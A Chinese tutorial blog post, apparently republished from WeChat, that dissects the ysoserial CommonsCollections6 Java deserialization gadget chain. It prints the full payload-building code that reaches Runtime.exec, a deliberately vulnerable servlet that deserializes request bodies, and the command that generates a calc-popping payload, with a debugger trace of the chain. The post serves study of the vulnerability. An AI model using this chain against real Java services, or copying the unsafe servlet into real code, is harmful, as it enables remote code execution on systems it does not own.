<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OIHH0ZaLresJ8keWNcgDew)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDw1JEvuYxWTZ3ugStv1LuZCQUKDrib0z1EsJPqUfeLx4DgbKqAKhlIsw/640?wx_fmt=png)

前言
--

继续学习 ysoserial 中的 CommonsCollections6 反序列化利用链。

ysoserial 中 CC6 payload 构造
--------------------------

先看下 yso 中 cc6 这条链的 payload 是怎么构造的，后续我们再分析反序列化的过程。

```
public Serializable getObject(final String command) throws Exception {

   final String[] execArgs = new String[] { command };

   final Transformer[] transformers = new Transformer[] {
           new ConstantTransformer(Runtime.class),
           new InvokerTransformer("getMethod", new Class[] {
                   String.class, Class[].class }, new Object[] {
                   "getRuntime", new Class[0] }),
           new InvokerTransformer("invoke", new Class[] {
                   Object.class, Object[].class }, new Object[] {
                   null, new Object[0] }),
           new InvokerTransformer("exec",
                   new Class[] { String.class }, execArgs),
           new ConstantTransformer(1) };

   Transformer transformerChain = new ChainedTransformer(transformers);

   final Map innerMap = new HashMap();

   final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

   TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

   HashSet map = new HashSet(1);
   map.add("foo");
   Field f = null;
   try {
       f = HashSet.class.getDeclaredField("map");
  } catch (NoSuchFieldException e) {
       f = HashSet.class.getDeclaredField("backingMap");
  }

   Reflections.setAccessible(f);
   HashMap innimpl = (HashMap) f.get(map);

   Field f2 = null;
   try {
       f2 = HashMap.class.getDeclaredField("table");
  } catch (NoSuchFieldException e) {
       f2 = HashMap.class.getDeclaredField("elementData");
  }

   Reflections.setAccessible(f2);
   Object[] array = (Object[]) f2.get(innimpl);

   Object node = array[0];
   if(node == null){
       node = array[1];
  }

   Field keyField = null;
   try{
       keyField = node.getClass().getDeclaredField("key");
  }catch(Exception e){
       keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
  }

   Reflections.setAccessible(keyField);
   keyField.set(node, entry);

   return map;

}

```

前面生成 ChainedTransformer 利用链的过程跟 cc1 一致，不作过多讲解。

```
final Map innerMap = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

```

将 ChainedTransformer 绑定到 map 对象上，当调用 get 方法的时候，就会调用到 ChainedTransformer 的 transform 方法，从而引起连锁反应执行命令。

TiedMapEntry 类：

```
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

```

该类的作用在 cc5 反序列化分析时也进行过讲解：传入构造函数的分别是 LazyMap 实例化对象（赋值给 TiedMapEntry 的`map`属性）和占位字符串（赋值给 TiedMapEntry 的`key`属性），在`TiedMapEntry.getValue`这个方法中，调用`this.map.get()`方法，就和前面的串联起来达成命令执行了。

### 多次反射操作

下面的代码比较长，是多次反射操作，我们拆开来看。

第一次反射：

```
HashSet map = new HashSet(1);
map.add("foo");
Field f = null;
try {
   f = HashSet.class.getDeclaredField("map");
} catch (NoSuchFieldException e) {
   f = HashSet.class.getDeclaredField("backingMap");
}

Reflections.setAccessible(f);
HashMap innimpl = (HashMap) f.get(map);

```

这里的 try catch 应该是为了兼容不同版本的 jdk。

创建了一个`HashSet`对象，容量为 1，添加了个 "foo" 字符串。

随后通过反射的方法获取到`HashSet`对象的成员变量`map`，其为`HashMap`类型，定义为变量名`innimpl`。

第二次反射：

```
Field f2 = null;
try {
   f2 = HashMap.class.getDeclaredField("table");
} catch (NoSuchFieldException e) {
   f2 = HashMap.class.getDeclaredField("elementData");
}

Reflections.setAccessible(f2);
Object[] array = (Object[]) f2.get(innimpl);

```

通过反射的方法获取到`HashMap`对象的成员变量`table`，其为对象数组（Object[]）类型，定义为变量名`array`。

第三次反射：

```
Object node = array[0];
if(node == null){
   node = array[1];
}

Field keyField = null;
try{
   keyField = node.getClass().getDeclaredField("key");
}catch(Exception e){
   keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
}

Reflections.setAccessible(keyField);
keyField.set(node, entry);

```

获取`HashMap`对象的成员变量`table`的第一个元素或者第二个元素，命名为`node`变量，通过反射获取`node`变量的成员变量 key，并该成员变量修改为之前构造好的`TiedMapEntry`类型对象。

这部分代码很多，其实就是一个赋值操作：

```
HashSet map = new HashSet(1);
map.add("foo");
map.map.table[0].key = entry; // or map.map.table[1].key = entry;
return map;

```

map 是`HashSet`对象，也就是**集合**，集合的特性就是：没有重复的元素。

这一系列的操作就是，往集合`map`中添加元素`foo`，再通过反射把这个元素改为 entry。这里抛出一个疑问后面解答，为什么不直接往 map 内添加 entry。

先分析 HashSet 这些类。  

### HashSet HashMap 类

HashSet 的成员变量 map 为 HashMap 类型：

```
private transient HashMap<E,Object> map;

```

HashSet 的 add 方法在添加新元素时，会把添加的新元素设置为 map 的 key，因为 HashMap 的 key 唯一，所以 HashSet 将 HashMap 的 key 当做自己的元素，通过这种方式保证了 HashSet 没有重复元素：

```
public boolean add(E e) {
   return map.put(e, PRESENT)==null;
}

```

HashMap 的 table 成员变量是 Node 类型数组，Node 是 HashMap 的内部静态类，HashMap 每添加一个新元素都会放在 Node 数组里，Node 类包含了 map 的 hash，key，value 等信息：

```
static class Node<K,V> implements Map.Entry<K,V> {
   final int hash;
   final K key;
   V value;
   Node<K,V> next;

   Node(int hash, K key, V value, Node<K,V> next) {
       this.hash = hash;
       this.key = key;
       this.value = value;
       this.next = next;
  }

```

反序列化过程分析
--------

### 1. 创建 web 项目

创建一个 maven web 项目，并创建一个 servlet 如下：

```
package com.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;

@WebServlet("/s1")
public class Servlet1 extends HttpServlet {
   @Override
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       InputStream inputStream = req.getInputStream();
       ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
       try {
           objectInputStream.readObject();
      } catch (ClassNotFoundException e) {
           e.printStackTrace();
      }
  }

   @Override
   protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       this.doGet(req, resp);
  }
}

```

pom.xml 中添加 commons-collections 3.1 依赖

```
<dependency>
<groupId>commons-collections</groupId>
<artifactId>commons-collections</artifactId>
<version>3.1</version>
</dependency>

```

使用 yso 生成 calc 命令的 payload：

```
java -jar CommonsCollections6 calc > cc6.ser

```

利用 burp 发送 payload，成功执行命令弹出计算器：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDhlAbJjkvIDlBkLsawiaMvVMibEp2779ibwNFLpoichfwLyZSGLbr133Agg/640?wx_fmt=png)

### 2. 反序列化链分析

通过前面的学习我们知道，该反序列化链会执行`LazyMap.get()`方法，从而引发后面的连锁反应，所以我们在`LazyMap.get()`方法处打上断点，查看函数栈帧的调用：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eD1dZo6NvAtNiceCWiaKDPmrKLZECP0p7chhSEwPrzQqbvoEPnC7FRaZqw/640?wx_fmt=png)

#### HashSet.readObject()

```
private void readObject(java.io.ObjectInputStream s)
   throws java.io.IOException, ClassNotFoundException {
   // Read in any hidden serialization magic
   s.defaultReadObject();

   // Read in HashMap capacity and load factor and create backing HashMap
   int capacity = s.readInt();
   float loadFactor = s.readFloat();
   map = (((HashSet)this) instanceof LinkedHashSet ?
          new LinkedHashMap<E,Object>(capacity, loadFactor) :
          new HashMap<E,Object>(capacity, loadFactor));

   // Read in size
   int size = s.readInt();

   // Read in all elements in the proper order.
   for (int i=0; i<size; i++) {
       E e = (E) s.readObject();
       map.put(e, PRESENT);
  }
}

```

HashSet 有自己的 readObject 方法，它和 HashMap 同理，先创建个空的 HashSet，再把元素一个个 put 进去。这里 put 的元素正是之前构造的 `TiedMapEntry` 对象。

put 时获取`TiedMapEntry`对象的 hash：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDJFNqMGlh0BbAZIkibVMNZIUmg5HOfIvtPdsMeia5MXuJrY6Vsic14sO8Q/640?wx_fmt=png)

调用`TiedMapEntry.hashCode`方法：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDU5feXRGicjiahN1uQicsfIy5ax1tkjO5tExc8elEaCsgXSic89liaQz547g/640?wx_fmt=png)

而在`TiedMapEntry.hashCode`方法中，就会调用`TiedMapEntry.getValue()`方法：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDOmQXnm3IwkvdMpYyHb7lWLQMYyt1kHN02zs1FeEkLHbbwtMG4uSmbw/640?wx_fmt=png)

从而调用`LazyMap.get()`方法引起连锁反应。

#### 问题：为什么不直接在 HashSet 对象中添加 TiedMapEntry 对象

我们看看`LazyMap.get()`方法引起连锁反应的条件是什么：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XXOW2rWVl5JfLdyNhtoW2eDiaSyx8LnWe6XTc4xua4tbozCyKF8McCklaXdNq8EN6JPtiaicp5lX0ScA/640?wx_fmt=png)

需要`LazyMap`中的`HashMap`不包含此 key，才会进入 if 条件，从而执行后面的`transform`方法。

如果我们直接在 HashSet 中添加`TiedMapEntry`对象

```
map.add(entry);

```

add 方法如下：

```
public boolean add(E e) {
   return map.put(e, PRESENT)==null;
}

```

这里的 map 为`HashMap`对象。

继续跟进看代码：

```
public V put(K key, V value) {
   return putVal(hash(key), key, value, false, true);
}

```

对 TiedMapEntry 对象计算 hash，就会调用 TiedMapEntry 对象的 hashCode 方法，调用 TiedMapEntry 对象的 getValue() 方法，然后就会调用 LazyMap 的 get 方法：

```
public Object get(Object key) {
   if (!super.map.containsKey(key)) {
       Object value = this.factory.transform(key);
       super.map.put(key, value);
       return value;
  } else {
       return super.map.get(key);
  }
}

```

这里 LazyMap 显然没有这个 key，进入这个 if 中，在这个 if 里面则会新建一个键值对。

HashSet 调用 add 添加的元素，会在 LazyMap 里添加一个和这个元素相同的 key，则下次调用 LazyMap 的 get 方法时，不会创建新的键值对，也就不会调用 Transformer 链，不会造成 rce。所以在构造 payload 时，不能使用 HashSet 的 add 方法添加构造好的 map 对象，要用反射修改。

参考链接
----

https://www.freebuf.com/articles/web/312176.html